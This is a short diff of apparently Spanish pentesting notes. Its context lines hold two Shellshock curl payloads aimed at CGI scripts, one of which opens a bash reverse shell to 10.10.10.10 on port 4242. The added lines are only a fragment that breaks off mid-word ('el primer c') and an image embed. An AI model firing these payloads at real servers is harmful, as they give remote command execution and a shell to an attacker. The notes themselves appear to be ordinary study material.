@@ -746,3 +746,6 @@ curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://10.11.2.12/cgi-bi
 curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http://10.10.10.10/cgi-bin/user.sh
 ```
 
+`Identificando`
+en este caso el primer c
+![[Pasted image 20240622195528.png]]
